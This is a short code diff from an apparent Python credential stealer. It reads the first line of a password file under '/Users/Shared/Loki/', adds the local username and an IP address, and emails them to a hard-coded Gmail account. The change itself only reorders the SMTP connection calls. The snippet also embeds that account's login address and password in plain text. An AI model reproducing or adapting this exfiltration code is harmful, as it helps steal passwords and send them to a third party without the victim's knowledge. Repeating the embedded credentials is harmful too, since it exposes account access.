@@ -18,11 +18,10 @@ with open('/Users/Shared/Loki/Password.txt') as f:
 message = getpass.getuser() + "\n" + first_line + "\n" + ip
 msg.attach(MIMEText(message))
 
-mailserver = smtplib.SMTP('smtp.gmail.com',587)
-mailserver.starttls()
-mailserver.ehlo()
-mailserver.login('th3ta403@gmail.com', 'Theta403')
-
-mailserver.sendmail('th3ta403@gmail.com','th3ta403@gmail.com',msg.as_string())
+mailserver = smtplib.SMTP ("smtp.gmail.com")
+mailserver.ehlo ()
+mailserver.starttls ()
+mailserver.login ('th3ta403@gmail.com', 'Theta403')
+mailserver.sendmail ("th3ta403@gmail.com", "th3ta403@gmail.com", msg.as_string ())
 
 mailserver.quit()
